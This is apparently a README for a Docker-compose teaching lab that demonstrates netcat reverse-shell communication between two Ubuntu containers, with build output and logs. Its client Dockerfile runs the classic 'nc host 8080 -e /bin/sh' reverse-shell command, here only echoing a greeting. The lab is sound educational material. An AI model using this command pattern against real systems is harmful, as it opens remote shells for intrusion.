# Example of reverse shell communication with `netcat`

This example contains a collection of [ubuntu](https://hub.docker.com/_/ubuntu/) Docker containers, orchestrated with [docker-compose](https://docs.docker.com/compose/) to illustrate the basic mechanics of reverse-shell communication using `netcat`.

```
.
├── client
│   └── Dockerfile
├── develop-net
│   └── Dockerfile
├── docker-compose.yml
└── web
    └── Dockerfile
```

### Build the `develop-net` base image

This image uses in `netcat` for implementing the reverse shell, while `telnet` and `iputils-ping` are only installed for purposes like testing connectivity.

```
$ docker build -t infosecrnd/develop-net develop-net/
Sending build context to Docker daemon 2.048 kB
Step 1 : FROM ubuntu
 ---> cf62323fa025
Step 2 : RUN apt-get update && apt-get -y install netcat telnet iputils-ping
 ---> Using cache
 ---> a9414c08589d
Successfully built a9414c08589d
```

### Building and running with `docker-compose`

1. **netcatreverseshell\_web\_1** acts as a "web" server, listening for incomming traffic: `nc -p 8080 -l`.
2. **netcatreverseshell\_client\_1** sends a friendly greeting to the "web" server, including variables from the client's environment: `/bin/sh -c echo ${HOSTNAME}: Hello World`.


```
$ docker-compose up -d --build
Creating network "netcatreverseshell_default" with the default driver
Building web
Step 1 : FROM infosecrnd/develop-net
 ---> a9414c08589d
Step 2 : CMD nc -p 8080 -l
 ---> Using cache
 ---> 9c58d2e05d26
Successfully built 9c58d2e05d26
Building client
Step 1 : FROM infosecrnd/develop-net
 ---> a9414c08589d
Step 2 : CMD nc netcatreverseshell_web_1 8080 -e /bin/sh -c echo ${HOSTNAME}: Hello World
 ---> Using cache
 ---> 702b01ece3b9
Successfully built 702b01ece3b9
Creating netcatreverseshell_web_1
Creating netcatreverseshell_client_1
```


```
$ docker logs netcatreverseshell_web_1 
85e2014c7364: Hello World
```
